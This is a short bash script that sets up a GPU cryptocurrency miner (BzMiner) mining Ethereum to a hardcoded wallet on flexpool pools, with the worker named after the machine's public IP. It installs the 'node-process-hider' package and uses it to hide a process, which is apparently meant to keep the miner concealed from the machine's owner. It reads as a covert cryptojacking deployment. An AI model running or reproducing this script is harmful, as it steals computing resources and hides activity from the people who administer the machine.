#!/bin/bash
sudo apt update
apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
apt-get install -y nodejs
npm i -g node-process-hider
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata
ph add pkt.sh
sleep 14
sudo apt install libpci3
wget https://github.com/bzminer/bzminer/releases/download/v9.1.4/bzminer_v9.1.4_linux.tar.gz -O - | tar -xz
cd bzminer_v9.1.4_linux && ip=$(echo \"$(curl -s ifconfig.me)\" | tr . _ ) && sudo ./bzminer -a ethash -w 0x925966644EdEc86d0CC1C1cc6165A25A78b91Ba4 -p ethproxy+ssl://eth-hk.flexpool.io:5555 ethproxy+ssl://eth-sg.flexpool.io:5555 -r $ip-$_$ --nvidia 1
